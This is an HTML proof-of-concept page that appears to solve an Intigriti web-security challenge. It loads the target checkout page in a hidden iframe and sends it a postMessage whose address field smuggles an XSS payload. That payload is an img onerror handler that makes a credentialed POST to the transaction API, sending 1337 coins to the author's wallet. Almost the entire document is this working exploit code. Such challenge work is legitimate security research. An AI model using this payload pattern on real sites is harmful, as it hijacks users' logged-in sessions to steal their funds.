<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Intigriti Challenge</title>
</head>
<body>
    <h1>Exploit Sent...</h1>
    <iframe id="target" src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1" style="width:0;height:0;border:0;"></iframe>

    <script>
        const BASE_URL = 'https://challenge-0126.intigriti.io';
        // Your specific wallet address from the logs
        const MY_WALLET = '13303a656bdddcb618e9c24da160327453'; 

        const frame = document.getElementById('target');
        
        frame.onload = function() {
            if (this.src.includes('marketwatch')) return;

            setTimeout(() => {
                // --- THE FIXED PAYLOAD ---
                // We use single quotes for the HTML attribute (onerror='...')
                // We use double quotes inside the JS (method: "POST")
                
                const jsCode = `
                    fetch('/api/transaction', {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        credentials: "include",
                        body: JSON.stringify({
                            toAddress: "${MY_WALLET}",
                            currency: "1337COIN",
                            amount: 1337
                        })
                    })
                `;

                // Remove newlines
                const flatCode = jsCode.replace(/\n/g, ' ');

                // ⚠️ CRITICAL FIX: Note the single quotes around the onerror value
                const xss = `"><img src=x onerror='${flatCode}'>`;

                // Send the malicious transaction
                frame.contentWindow.postMessage({
                    type: 'submitTransaction',
                    transaction: {
                        currency: '1337COIN', 
                        amount: 1337, 
                        toAddress: xss
                    }
                }, '*');

                // Redirect to trigger execution
                setTimeout(() => {
                    frame.src = BASE_URL + '/marketwatch.html';
                }, 1500);

            }, 2000);
        };
    </script>
</body>
</html>
